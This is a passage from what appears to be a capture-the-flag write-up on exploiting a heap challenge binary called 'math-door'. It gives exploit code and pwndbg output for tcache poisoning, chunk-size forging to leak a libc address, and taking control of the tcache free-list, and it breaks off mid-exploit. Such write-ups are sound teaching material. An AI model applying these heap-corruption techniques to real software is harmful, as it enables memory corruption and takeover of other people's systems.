+0x561a5b60c1b0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c1c0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c1d0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c1e0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c1f0  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c200  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c210  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c220  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c230  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c250  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c260  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c270  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c280  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x561a5b60c290  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000000021</span>      <span class="code-dark-magenta">........!.......</span>
+0x561a5b60c2a0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000561a5b60c010</span>      <span class="code-dark-magenta">..........`[.V..</span>         &lt;-- tcachebins[0x20][4/5]  
+0x561a5b60c2b0  <span class="code-dark-magenta">0x0000000000000000</span>      <span class="code-dark-green">0x0000000000000021</span>      <span class="code-dark-green">........!.......</span>
+0x561a5b60c2c0  <span class="code-dark-green">0x0000561a5b60c2a0</span>      <span class="code-dark-green">0x0000561a5b60c010</span>      <span class="code-dark-green">..`[.V....`[.V..</span>         &lt;-- tcachebins[0x20][3/5]
+0x561a5b60c2d0  <span class="code-dark-green">0x0000000000000000</span>      <span class="code-dark-blue">0x0000000000000021</span>      <span class="code-dark-blue">........!.......</span>
+0x561a5b60c2e0  <span class="code-dark-blue">0x0000561a5b60c2c0</span>      <span class="code-dark-blue">0x0000561a5b60c010</span>      <span class="code-dark-blue">..`[.V....`[.V..</span>         &lt;-- tcachebins[0x20][2/5]
+0x561a5b60c2f0  <span class="code-dark-blue">0x0000000000000000</span>      <span class="code-dark-yellow">0x0000000000000021</span>      <span class="code-dark-yellow">........!.......</span>
+0x561a5b60c300  <span class="code-dark-yellow">0x0000561a5b60c2e0</span>      <span class="code-dark-yellow">0x0000561a5b60c010</span>      <span class="code-dark-yellow">..`[.V....`[.V..</span>         &lt;-- tcachebins[0x20][1/5]
+0x561a5b60c310  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000021</span>      <span class="code-dark-cyan">........!.......</span>
+0x561a5b60c320  <span class="code-dark-cyan">0x0000561a5b60c300</span>      <span class="code-dark-cyan">0x0000561a5b60c010</span>      <span class="code-dark-cyan">..`[.V....`[.V..</span>         &lt;-- tcachebins[0x20][0/5]
+0x561a5b60c330  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-magenta">0x0000000000020cd1</span>      <span class="code-dark-magenta">................</span>         &lt;-- Top chunk
+<span class="code-red">pwndbg&gt; </span>tcachebins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x20 [  5]</span>: <span class="code-dark-blue">0x561a5b60c320</span> —▸ <span class="code-dark-blue">0x561a5b60c300</span> —▸ <span class="code-dark-blue">0x561a5b60c2e0</span> —▸ <span class="code-dark-blue">0x561a5b60c2c0</span> —▸ <span class="code-dark-blue">0x561a5b60c2a0</span> ◂— 0x0
+</code></pre></div><p>The next chunk that will be allocated is at address <code>0x561a5b60c320</code>, because the head of the Tcache (within the large cyan section) points there. This is a good value to control because if so, we can control where the next allocated chunk will be placed (we will see this later).</p><p>The Tcache poisoning works because if we modify the address at <code>0x561a5b60c320</code> (which is ``0x561a5b60c300`), the linked list will be corrupt and the head of the Tcache will point to another location. That is why Tcache poisoning grants a potential write-what-where primitive. Also, the Tcache is a very exploitable structure because it applies only a few checks and they can be easily bypassed.</p><h3 id="heap-_feng-shui_">Heap <em>feng shui</em></h3><p>We will modify the <code>fd</code> pointer of a chunk to be able to modify the size of another chunk. Once allocated in the target position, we will set the new size to <code>0x421</code> so that it does not fit in the Tcache. Then, when freeing it, the heap allocator will treat it as an Unsorted Bin chunk and set <code>fd</code> and <code>bk</code> fields pointing to an offset of <code>main_arena</code>.</p><p>After a bit of debugging, we have this code:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
+<span class="mtk1">    </span><span class="mtk8 mtku">gdb</span><span class="mtk1">.</span><span class="mtk8">attach</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk4">'continue'</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">38</span>
+
+<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">_</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk1">M</span><span class="mtk1">):</span>
+<span class="mtk1">        </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">50</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M + 1</span>
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffffffffffb0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">421</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">4</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
+</code></pre></div><p>Notice how negative values must be entered using <a href="https://en.wikipedia.org/wiki/Two%27s_complement">two&rsquo;s complement</a>. We can define a simple function in Python to calculate these negative offsets:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; def two_c(num: int) -&gt; str:
+...     return hex(((~abs(num)) + 1) & 0xffffffffffffffff)  
+...
+&gt;&gt;&gt; two_c(-0x50)
+'0xffffffffffffffb0'
+</code></pre></div><p>Anyway, this is the result:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './math-door'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'.'</span>
+[<span class="code-green">+</span>] Starting local process './math-door': pid 332255
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './math-door', '332255', '-x', '/tmp/pwnqcf_s9c0.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Switching to interactive mode
+1. Create
+2. Delete
+3. Add value
+Action:
+<span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>heap
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d22000</span>
+Size: 0x291
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d22290</span>
+Size: 0x21
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d222b0</span>
+Size: 0x21
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d222d0</span>
+Size: 0x21
+
+<span class="code-dark-yellow">Allocated chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d222f0</span>
+Size: 0x21
+
+<span class="code-dark-green">Free chunk (unsortedbin)</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d22310</span>
+Size: 0x421
+<span class="code-red">fd</span>: 0x7f24a2f00be0
+<span class="code-red">bk</span>: 0x7f24a2f00be0
+
+<span class="code-dark-yellow">Allocated chunk</span>
+Addr: <span class="code-dark-blue">0x555f98d22730</span>
+Size: 0x20
+
+<span class="code-dark-red">Top chunk</span> | <span class="code-dark-yellow">PREV_INUSE</span>
+Addr: <span class="code-dark-blue">0x555f98d22750</span>
+Size: 0x208b1
+
+<span class="code-red">pwndbg&gt; </span>bins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x20 [  1]</span>: 0x0
+<span class="code-dark-blue">fastbins</span>
+<span class="code-dark-yellow">0x20</span>: 0x0
+<span class="code-dark-yellow">0x30</span>: 0x0
+<span class="code-dark-yellow">0x40</span>: 0x0
+<span class="code-dark-yellow">0x50</span>: 0x0
+<span class="code-dark-yellow">0x60</span>: 0x0
+<span class="code-dark-yellow">0x70</span>: 0x0
+<span class="code-dark-yellow">0x80</span>: 0x0
+<span class="code-dark-blue">unsortedbin</span>
+<span class="code-dark-yellow">all</span>: <span class="code-dark-blue">0x555f98d22310</span> —▸ <span class="code-dark-magenta">0x7f24a2f00be0 (main_arena+96)</span> ◂— 0x555f98d22310  
+<span class="code-dark-blue">smallbins</span>
+<span class="code-dark-yellow">empty</span>
+<span class="code-dark-blue">largebins</span>
+<span class="code-dark-yellow">empty</span>
+</code></pre></div><p>Alright, we have a Glibc address that we can use as reference to allocate chunks at relative offsets within Glibc. But first of all, notice that the Tcache is a bit corrupt. The heap allocator thinks there is a single Tcache free chunk, but the free-list is empty.</p><p>Now, the objective is to fully control the Tcache, so we will be aiming to get a chunk located at the head of the Tcache free-list of size <code>0x21</code>. I did it with these lines of code and some debugging:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">11</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">12</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">13</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">14</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">14</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">fffffffffffffc50</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M + 2</span>
+<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">)  </span><span class="mtk3"># M + 3</span>
+</code></pre></div><p>Now, at index <code>M + 3</code> I have a chunk near the head of the Tcache free-list. We can confirm it using GDB while running the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/64gx &chunks
+<span class="code-dark-blue">0x5559ccbf6060</span> &lt;<span class="code-dark-yellow">chunks</span>&gt;:        0x00005559ce00d2a0      0x00005559ce00d2c0  
+<span class="code-dark-blue">0x5559ccbf6070</span> &lt;<span class="code-dark-yellow">chunks</span>+16&gt;:     0x00005559ce00d2e0      0x00005559ce00d300
+<span class="code-dark-blue">0x5559ccbf6080</span> &lt;<span class="code-dark-yellow">chunks</span>+32&gt;:     0x00005559ce00d320      0x00005559ce00d340
+<span class="code-dark-blue">0x5559ccbf6090</span> &lt;<span class="code-dark-yellow">chunks</span>+48&gt;:     0x00005559ce00d360      0x00005559ce00d380
+<span class="code-dark-blue">0x5559ccbf60a0</span> &lt;<span class="code-dark-yellow">chunks</span>+64&gt;:     0x00005559ce00d3a0      0x00005559ce00d3c0
+<span class="code-dark-blue">0x5559ccbf60b0</span> &lt;<span class="code-dark-yellow">chunks</span>+80&gt;:     0x00005559ce00d3e0      0x00005559ce00d400
+<span class="code-dark-blue">0x5559ccbf60c0</span> &lt;<span class="code-dark-yellow">chunks</span>+96&gt;:     0x00005559ce00d420      0x00005559ce00d440
+<span class="code-dark-blue">0x5559ccbf60d0</span> &lt;<span class="code-dark-yellow">chunks</span>+112&gt;:    0x00005559ce00d460      0x00005559ce00d480
+<span class="code-dark-blue">0x5559ccbf60e0</span> &lt;<span class="code-dark-yellow">chunks</span>+128&gt;:    0x00005559ce00d4a0      0x00005559ce00d4c0
+<span class="code-dark-blue">0x5559ccbf60f0</span> &lt;<span class="code-dark-yellow">chunks</span>+144&gt;:    0x00005559ce00d4e0      0x00005559ce00d500
+<span class="code-dark-blue">0x5559ccbf6100</span> &lt;<span class="code-dark-yellow">chunks</span>+160&gt;:    0x00005559ce00d520      0x00005559ce00d540
+<span class="code-dark-blue">0x5559ccbf6110</span> &lt;<span class="code-dark-yellow">chunks</span>+176&gt;:    0x00005559ce00d560      0x00005559ce00d580
+<span class="code-dark-blue">0x5559ccbf6120</span> &lt;<span class="code-dark-yellow">chunks</span>+192&gt;:    0x00005559ce00d5a0      0x00005559ce00d5c0
+<span class="code-dark-blue">0x5559ccbf6130</span> &lt;<span class="code-dark-yellow">chunks</span>+208&gt;:    0x00005559ce00d5e0      0x00005559ce00d600
+<span class="code-dark-blue">0x5559ccbf6140</span> &lt;<span class="code-dark-yellow">chunks</span>+224&gt;:    0x00005559ce00d620      0x00005559ce00d640
+<span class="code-dark-blue">0x5559ccbf6150</span> &lt;<span class="code-dark-yellow">chunks</span>+240&gt;:    0x00005559ce00d660      0x00005559ce00d680
+<span class="code-dark-blue">0x5559ccbf6160</span> &lt;<span class="code-dark-yellow">chunks</span>+256&gt;:    0x00005559ce00d6a0      0x00005559ce00d6c0
+<span class="code-dark-blue">0x5559ccbf6170</span> &lt;<span class="code-dark-yellow">chunks</span>+272&gt;:    0x00005559ce00d6e0      0x00005559ce00d700
+<span class="code-dark-blue">0x5559ccbf6180</span> &lt;<span class="code-dark-yellow">chunks</span>+288&gt;:    0x00005559ce00d720      0x00005559ce00d740
+<span class="code-dark-blue">0x5559ccbf6190</span> &lt;<span class="code-dark-yellow">chunks</span>+304&gt;:    0x00005559ce00d2a0      0x00005559ce00d310
+<span class="code-dark-blue">0x5559ccbf61a0</span> &lt;<span class="code-dark-yellow">chunks</span>+320&gt;:    0x00005559ce00d460      0x00005559ce00d090
+<span class="code-dark-blue">0x5559ccbf61b0</span> &lt;<span class="code-dark-yellow">chunks</span>+336&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf61c0</span> &lt;<span class="code-dark-yellow">chunks</span>+352&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf61d0</span> &lt;<span class="code-dark-yellow">chunks</span>+368&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf61e0</span> &lt;<span class="code-dark-yellow">chunks</span>+384&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf61f0</span> &lt;<span class="code-dark-yellow">chunks</span>+400&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf6200</span> &lt;<span class="code-dark-yellow">chunks</span>+416&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf6210</span> &lt;<span class="code-dark-yellow">chunks</span>+432&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf6220</span> &lt;<span class="code-dark-yellow">chunks</span>+448&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf6230</span> &lt;<span class="code-dark-yellow">chunks</span>+464&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf6240</span> &lt;<span class="code-dark-yellow">chunks</span>+480&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5559ccbf6250</span> &lt;<span class="code-dark-yellow">chunks</span>+496&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x/4gx 0x00005559ce00d090
+<span class="code-dark-blue">0x5559ce00d090</span>: 0x00005559ce00d090      0x0000000000000000
+<span class="code-dark-blue">0x5559ce00d0a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>tcache
+{
+  counts = {3, 0 &lt;repeats 63 times&gt;},
+  entries = {0x5559ce00d090, 0x0 &lt;repeats 63 times&gt;}
+}
+<span class="code-red">pwndbg&gt; </span>tcachebins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x20 [  3]</span>: <span class="code-dark-blue">0x5559ce00d090</span> ◂— 0x5559ce00d090
+</code></pre></div><p>Obviously, at this point the heap allocator is so confused because the head of the list points to itself. But now we have full control over next allocated chunks.</p><p>Next, I cleaned up the Tcache and the heap and set the head of the Tcache point to the chunk that contained Glibc pointers (I also set the size back to <code>0x21</code> just in case):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">fffffffffffffc00</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>  
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">13</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">ffffffffffffff00</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">add_value</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk1">M</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">290</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">)</span>
+</code></pre></div><p>So this is the heap right now:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/64gx &chunks
+<span class="code-dark-blue">0x5613f4a4a060</span> &lt;<span class="code-dark-yellow">chunks</span>&gt;:        0x00005613f4fc02a0      0x00005613f4fc02c0
+<span class="code-dark-blue">0x5613f4a4a070</span> &lt;<span class="code-dark-yellow">chunks</span>+16&gt;:     0x00005613f4fc02e0      0x00005613f4fc0300
+<span class="code-dark-blue">0x5613f4a4a080</span> &lt;<span class="code-dark-yellow">chunks</span>+32&gt;:     0x00005613f4fc0320      0x00005613f4fc0340
+<span class="code-dark-blue">0x5613f4a4a090</span> &lt;<span class="code-dark-yellow">chunks</span>+48&gt;:     0x00005613f4fc0360      0x00005613f4fc0380
+<span class="code-dark-blue">0x5613f4a4a0a0</span> &lt;<span class="code-dark-yellow">chunks</span>+64&gt;:     0x00005613f4fc03a0      0x00005613f4fc03c0
+<span class="code-dark-blue">0x5613f4a4a0b0</span> &lt;<span class="code-dark-yellow">chunks</span>+80&gt;:     0x00005613f4fc03e0      0x00005613f4fc0400
+<span class="code-dark-blue">0x5613f4a4a0c0</span> &lt;<span class="code-dark-yellow">chunks</span>+96&gt;:     0x00005613f4fc0420      0x00005613f4fc0440
+<span class="code-dark-blue">0x5613f4a4a0d0</span> &lt;<span class="code-dark-yellow">chunks</span>+112&gt;:    0x00005613f4fc0460      0x00005613f4fc0480
+<span class="code-dark-blue">0x5613f4a4a0e0</span> &lt;<span class="code-dark-yellow">chunks</span>+128&gt;:    0x00005613f4fc04a0      0x00005613f4fc04c0
+<span class="code-dark-blue">0x5613f4a4a0f0</span> &lt;<span class="code-dark-yellow">chunks</span>+144&gt;:    0x00005613f4fc04e0      0x00005613f4fc0500
+<span class="code-dark-blue">0x5613f4a4a100</span> &lt;<span class="code-dark-yellow">chunks</span>+160&gt;:    0x00005613f4fc0520      0x00005613f4fc0540
+<span class="code-dark-blue">0x5613f4a4a110</span> &lt;<span class="code-dark-yellow">chunks</span>+176&gt;:    0x00005613f4fc0560      0x00005613f4fc0580
+<span class="code-dark-blue">0x5613f4a4a120</span> &lt;<span class="code-dark-yellow">chunks</span>+192&gt;:    0x00005613f4fc05a0      0x00005613f4fc05c0
+<span class="code-dark-blue">0x5613f4a4a130</span> &lt;<span class="code-dark-yellow">chunks</span>+208&gt;:    0x00005613f4fc05e0      0x00005613f4fc0600
+<span class="code-dark-blue">0x5613f4a4a140</span> &lt;<span class="code-dark-yellow">chunks</span>+224&gt;:    0x00005613f4fc0620      0x00005613f4fc0640
+<span class="code-dark-blue">0x5613f4a4a150</span> &lt;<span class="code-dark-yellow">chunks</span>+240&gt;:    0x00005613f4fc0660      0x00005613f4fc0680
+<span class="code-dark-blue">0x5613f4a4a160</span> &lt;<span class="code-dark-yellow">chunks</span>+256&gt;:    0x00005613f4fc06a0      0x00005613f4fc06c0
+<span class="code-dark-blue">0x5613f4a4a170</span> &lt;<span class="code-dark-yellow">chunks</span>+272&gt;:    0x00005613f4fc06e0      0x00005613f4fc0700
+<span class="code-dark-blue">0x5613f4a4a180</span> &lt;<span class="code-dark-yellow">chunks</span>+288&gt;:    0x00005613f4fc0720      0x00005613f4fc0740
+<span class="code-dark-blue">0x5613f4a4a190</span> &lt;<span class="code-dark-yellow">chunks</span>+304&gt;:    0x00005613f4fc02a0      0x00005613f4fc0310
+<span class="code-dark-blue">0x5613f4a4a1a0</span> &lt;<span class="code-dark-yellow">chunks</span>+320&gt;:    0x00005613f4fc0460      0x00005613f4fc0090
+<span class="code-dark-blue">0x5613f4a4a1b0</span> &lt;<span class="code-dark-yellow">chunks</span>+336&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a1c0</span> &lt;<span class="code-dark-yellow">chunks</span>+352&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a1d0</span> &lt;<span class="code-dark-yellow">chunks</span>+368&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a1e0</span> &lt;<span class="code-dark-yellow">chunks</span>+384&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a1f0</span> &lt;<span class="code-dark-yellow">chunks</span>+400&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a200</span> &lt;<span class="code-dark-yellow">chunks</span>+416&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a210</span> &lt;<span class="code-dark-yellow">chunks</span>+432&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a220</span> &lt;<span class="code-dark-yellow">chunks</span>+448&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a230</span> &lt;<span class="code-dark-yellow">chunks</span>+464&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a240</span> &lt;<span class="code-dark-yellow">chunks</span>+480&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x5613f4a4a250</span> &lt;<span class="code-dark-yellow">chunks</span>+496&gt;:    0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x/4gx 0x00005613f4fc0090
+<span class="code-dark-blue">0x5613f4fc0090</span>: 0x00005613f4fc0320      0x0000000000000000
+<span class="code-dark-blue">0x5613f4fc00a0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>x/4gx 0x00005613f4fc0320
+<span class="code-dark-blue">0x5613f4fc0320</span>: 0x00007f5860e7fbe0      0x00007f5860e7fbe0
+<span class="code-dark-blue">0x5613f4fc0330</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-red">pwndbg&gt; </span>tcachebins
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x20 [  3]</span>: <span class="code-dark-blue">0x5613f4fc0320</span> —▸ <span class="code-dark-magenta">0x7f5860e7fbe0 (main_arena+96)</span> —▸ <span class="code-dark-blue">0x5613f4fc0750</span> ◂— 0x0  
